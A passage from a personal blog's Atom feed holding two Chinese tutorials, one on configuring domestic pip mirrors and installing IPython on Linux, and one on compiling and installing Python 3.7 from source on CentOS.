      <category term="教程" scheme="https://gz1903.github.io/tags/%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>Linux安装Ipython 交互式解释器</title>
    <link href="https://gz1903.github.io/2019/10/09/Linux%E5%AE%89%E8%A3%85Ipython-%E4%BA%A4%E4%BA%92%E5%BC%8F%E8%A7%A3%E9%87%8A%E5%99%A8/"/>
    <id>https://gz1903.github.io/2019/10/09/Linux安装Ipython-交互式解释器/</id>
    <published>2019-10-09T00:43:53.000Z</published>
    <updated>2019-10-14T06:13:27.461Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h3 id="Ipython-简介"><a href="#Ipython-简介" class="headerlink" title="Ipython 简介"></a>Ipython 简介</h3><p><strong>IPython外加一个文本编辑器</strong></p><p>Windows系统下是IPython加notepad++，Linux系统下是IPython加vim配合使用，写起代码来体验很流畅，很容易获取到写代码时候的那种“流体验”。</p><p>IPython的设计目的是在交互式计算和软件开发这两个方面最大化地提高生产力，它鼓励一种“执行-探索”的工作模式，支持matplotlib等库的绘图操作。同时IPython还提供一个基于WEB的交互式浏览器开发环境（Jupyter Notebook），用起来也很不错。</p><h3 id="配置使用国内源安装第三方模块"><a href="#配置使用国内源安装第三方模块" class="headerlink" title="配置使用国内源安装第三方模块"></a>配置使用国内源安装第三方模块</h3><h4 id="创建配置文件"><a href="#创建配置文件" class="headerlink" title="创建配置文件"></a>创建配置文件</h4><p>配置 pip3 使用国内源</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir ~/.pip</span><br><span class="line">vi ~/.pip/pip.conf</span><br><span class="line"><span class="comment"># Windows 下使用 pip.ini</span></span><br></pre></td></tr></table></figure><p>写入如下内容：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">index-url=https://mirrors.aliyun.com/pypi/simple</span><br></pre></td></tr></table></figure><blockquote><p><code>豆瓣源: https://pypi.douban.com/simple/</code></p><p><code>阿里源: https://mirrors.aliyun.com/pypi/simple</code></p><p><code>清华: https://pypi.tuna.tsinghua.edu.cn/simple</code></p><p><code>阿里云: http://mirrors.aliyun.com/pypi/simple/</code></p><p><code>中国科技大学 https://pypi.mirrors.ustc.edu.cn/simple/</code></p><p><code>华中理工大学: http://pypi.hustunique.com/</code></p><p><code>山东理工大学: http://pypi.sdutlinux.org/</code></p></blockquote><p>示例：<br> 比如安装一个执行远程主机命令的模块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@newrain ~]<span class="comment"># pip3 install paramiko</span></span><br><span class="line">Collecting paramiko</span><br><span class="line">  Downloading https://mirrors.aliyun.com/pypi/packages/4b/80/74dace9e48b0ef923633dfb5e48798f58a168e4734bca8ecfaf839ba051a/paramiko-2.6.0-py2.py3-none-any.whl (199kB)</span><br><span class="line">    100% |████████████████████████████████| 204kB 2.3MB/s </span><br><span class="line">Collecting bcrypt&gt;=3.1.3 (from paramiko)</span><br><span class="line">  Downloading https://mirrors.aliyun.com/pypi/packages/8b/1d/82826443777dd4a624e38a08957b975e75df859b381ae302cfd7a30783ed/bcrypt-3.1.7-cp34-abi3-manylinux1_x86_64.whl (56kB)</span><br><span class="line">    100% |████████████████████████████████| 61kB 3.1MB/s </span><br><span class="line">Collecting pynacl&gt;=1.0.1 (from paramiko)</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="安装-Ipython"><a href="#安装-Ipython" class="headerlink" title="安装 Ipython"></a>安装 Ipython</h3><h4 id="安装-python-devel"><a href="#安装-python-devel" class="headerlink" title="安装 python-devel"></a>安装 python-devel</h4><p>​         python-dev或python-devel称为是python的开发包，其中包括了一些用C/Java/C#等编写的python扩展在编译的时候依赖的头文件等信息。</p><p>比如：我们在编译一个用C语言编写的python扩展模块时，因为里面会有#include&lt;Python.h&gt;等这样的语句，因此我们就需要先安装python-devel开发包</p><p>执行以下命令安装即可（需要有 epel 源支持）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install python-devel</span><br></pre></td></tr></table></figure><h4 id="安装-ipython"><a href="#安装-ipython" class="headerlink" title="安装 ipython"></a>安装 ipython</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install ipython</span><br></pre></td></tr></table></figure><h4 id="启动-ipython"><a href="#启动-ipython" class="headerlink" title="启动 ipython"></a>启动 ipython</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@nginx2-8 ~]<span class="comment"># ipython</span></span><br><span class="line">Python 3.7.3 (default, Oct  8 2019, 15:49:02) </span><br><span class="line">Type <span class="string">'copyright'</span>, <span class="string">'credits'</span> or <span class="string">'license'</span> <span class="keyword">for</span> more information</span><br><span class="line">IPython 7.8.0 -- An enhanced Interactive Python. Type <span class="string">'?'</span> <span class="keyword">for</span> <span class="built_in">help</span>.</span><br><span class="line"></span><br><span class="line">In [1]:</span><br></pre></td></tr></table></figure><p>当pip安装ipython, bpython后, 直接执行ipython or bpython会报错：*python: command not found</p><h3 id="解决："><a href="#解决：" class="headerlink" title="解决："></a>解决：</h3><p>环境变量问题，设置别名就好。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`<span class="built_in">alias</span> ipython=``<span class="string">'python3 -m IPython'</span>``<span class="built_in">alias</span> bpython=``<span class="string">'python3 -m bpython'</span>`</span><br></pre></td></tr></table></figure><h4 id="退出-ipython"><a href="#退出-ipython" class="headerlink" title="退出 ipython"></a>退出 ipython</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@nginx2-8 ~]<span class="comment"># ipython</span></span><br><span class="line">Python 3.7.3 (default, Oct  8 2019, 15:49:02) </span><br><span class="line">Type <span class="string">'copyright'</span>, <span class="string">'credits'</span> or <span class="string">'license'</span> <span class="keyword">for</span> more information</span><br><span class="line">IPython 7.8.0 -- An enhanced Interactive Python. Type <span class="string">'?'</span> <span class="keyword">for</span> <span class="built_in">help</span>.</span><br><span class="line"></span><br><span class="line">In [1]: <span class="built_in">exit</span>                                                                                                           </span><br><span class="line">[root@nginx2-8 ~]<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img alt data-src="https://p.pstatp.com/origin/fe5a0000dc60465ac271" class="lozad"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="Python" scheme="https://gz1903.github.io/categories/Python/"/>
    
      <category term="教程" scheme="https://gz1903.github.io/categories/Python/%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="教程" scheme="https://gz1903.github.io/tags/%E6%95%99%E7%A8%8B/"/>
    
      <category term="Linux" scheme="https://gz1903.github.io/tags/Linux/"/>
    
      <category term="Python" scheme="https://gz1903.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Linux 编译安装Python3</title>
    <link href="https://gz1903.github.io/2019/10/08/Linux-%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85Python3/"/>
    <id>https://gz1903.github.io/2019/10/08/Linux-编译安装Python3/</id>
    <published>2019-10-08T12:05:49.000Z</published>
    <updated>2019-10-14T06:38:18.282Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h3 id="安装依赖软件包"><a href="#安装依赖软件包" class="headerlink" title="安装依赖软件包"></a>安装依赖软件包</h3><h4 id="centos里面是-devel，如果在ubuntu下安装则要改成-dev，依赖包缺一不可"><a href="#centos里面是-devel，如果在ubuntu下安装则要改成-dev，依赖包缺一不可" class="headerlink" title="centos里面是-devel，如果在ubuntu下安装则要改成-dev，依赖包缺一不可."></a><strong>centos里面是-devel，如果在ubuntu下安装则要改成-dev，依赖包缺一不可.</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum -y groupinstall <span class="string">"Development tools"</span></span><br><span class="line">yum -y install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gdbm-devel db4-devel libpcap-devel xz-devel libffi-devel</span><br></pre></td></tr></table></figure><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -o python3.7.tgz https://www.python.org/ftp/python/3.7.0/Python-3.7.0.tgz</span><br><span class="line">// 或者</span><br><span class="line">wget  https://www.python.org/ftp/python/3.7.0/Python-3.7.0.tgz</span><br></pre></td></tr></table></figure><h3 id="解压安装"><a href="#解压安装" class="headerlink" title="解压安装"></a>解压安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar -xf Python-3.7.0.tgz</span><br><span class="line"><span class="built_in">cd</span> Python-3.7.0/</span><br></pre></td></tr></table></figure><h3 id="进入目录后，执行下面的命令"><a href="#进入目录后，执行下面的命令" class="headerlink" title="进入目录后，执行下面的命令"></a><strong>进入目录后，执行下面的命令</strong></h3><p>修改文件 <code>Python-3.7.0/Modules/Setup.dist</code>， 去掉如下几行的注释 ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">readline readline.c -lreadline -ltermcap</span><br><span class="line"></span><br><span class="line">SSL=/usr/<span class="built_in">local</span>/ssl</span><br><span class="line">_ssl _ssl.c \</span><br><span class="line">        -DUSE_SSL -I$(SSL)/include -I$(SSL)/include/openssl \</span><br><span class="line">        -L$(SSL)/lib -lssl -lcrypto</span><br></pre></td></tr></table></figure><h4 id="或者在-shell-命令提示符下执行如下命令："><a href="#或者在-shell-命令提示符下执行如下命令：" class="headerlink" title="或者在 shell 命令提示符下执行如下命令："></a>或者在 <code>shell</code> 命令提示符下执行如下命令：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sed -ri <span class="string">'s/^#readline/readline/'</span> Modules/Setup.dist</span><br><span class="line">sed -ri <span class="string">'s/^#(SSL=)/\1/'</span> Modules/Setup.dist</span><br><span class="line">sed -ri <span class="string">'s/^#(_ssl)/\1/'</span> Modules/Setup.dist </span><br><span class="line">sed -ri <span class="string">'s/^#([\t]*-DUSE)/\1/'</span> Modules/Setup.dist </span><br><span class="line">sed -ri <span class="string">'s/^#([\t]*-L\$\(SSL\))/\1/'</span> Modules/Setup.dist</span><br></pre></td></tr></table></figure><h3 id="开始编译安装"><a href="#开始编译安装" class="headerlink" title="开始编译安装"></a><strong>开始编译安装</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./configure --<span class="built_in">enable</span>-shared --prefix=/usr/<span class="built_in">local</span>/python3</span><br><span class="line">make -j 2 &amp;&amp; make install</span><br></pre></td></tr></table></figure><blockquote><p>–enable-shared 指定安装共享库，共享库在使用其他需调用python的软件时会用到，比如使用<code>mod_wgsi</code> 连接Apache与python时需要。</p></blockquote><h3 id="创建软链接"><a href="#创建软链接" class="headerlink" title="创建软链接"></a>创建软链接</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /usr/<span class="built_in">local</span>/bin/python3/bin/python3 /usr/bin/python3</span><br><span class="line">ln -s /usr/<span class="built_in">local</span>/bin/python3/bin/pip3 /usr/bin/pip3</span><br></pre></td></tr></table></figure><h3 id="配置共享库文件"><a href="#配置共享库文件" class="headerlink" title="配置共享库文件"></a>配置共享库文件</h3><p>为所有用户设置共享库目录</p><p>用 vim 编辑器打开配置文件 <code>/etc/profile.d/python3.sh</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/profile.d/python3.sh</span><br></pre></td></tr></table></figure><p>在文件末尾写上如下内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python3.6 共享库目录</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/usr/<span class="built_in">local</span>/python3/bin</span><br></pre></td></tr></table></figure><p>编辑文件 <code>/etc/ld.so.conf.d/python3.conf</code>，并且添加如下内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/<span class="built_in">local</span>/python3/lib</span><br></pre></td></tr></table></figure><p>保存退出文件后， 执行如下命令 加载配置信息使其生效</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldconfig</span><br></pre></td></tr></table></figure><p>执行如下命令，使环境变量生效</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> /etc/profile.d/python3.sh</span><br></pre></td></tr></table></figure><h3 id="测试python3"><a href="#测试python3" class="headerlink" title="测试python3"></a>测试python3</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ python3</span><br><span class="line">Python 3.6.3 (default, Dec 17 2017, 04:11:01)</span><br><span class="line">[GCC 4.8.5 20150623 (Red Hat 4.8.5-11)] on linux</span><br><span class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> or <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span>(<span class="string">'qf'</span>)</span><br><span class="line">qf</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">exit</span>()</span><br></pre></td></tr></table></figure><blockquote><p>输入 <code>exit()</code> 即可退出 python3</p></blockquote><p><img alt data-src="https://p.pstatp.com/origin/fede000096c7f9decdf1" class="lozad"></p><h3 id="测试-pip3"><a href="#测试-pip3" class="headerlink" title="测试 pip3"></a>测试 pip3</h3><blockquote><p>一般情况下你不需要执行下面的安装命令。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@newrain ~]<span class="comment"># pip3 -V</span></span><br><span class="line">pip 9.0.3 from /usr/<span class="built_in">local</span>/lib/python3.6/site-packages (python 3.6)</span><br></pre></td></tr></table></figure><blockquote><p>假如上面显示的含有 python3.6 就没问题了，说名 pip3 安装的模块会安装到上面显示的目录下</p></blockquote><h3 id="特殊问题"><a href="#特殊问题" class="headerlink" title="特殊问题"></a><strong>特殊问题</strong></h3><p>假如 Python Shell 中敲击方向键显示「[[C[[D」<br> 可以安装以下包</p><blockquote><p>一般情况下你不需要执行下面的安装命令。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install gnureadline</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="Python" scheme="https://gz1903.github.io/categories/Python/"/>
    
      <category term="教程" scheme="https://gz1903.github.io/categories/Python/%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="教程" scheme="https://gz1903.github.io/tags/%E6%95%99%E7%A8%8B/"/>
    
      <category term="Linux" scheme="https://gz1903.github.io/tags/Linux/"/>
    
      <category term="Python" scheme="https://gz1903.github.io/tags/Python/"/>
    
  </entry>
  
</feed>
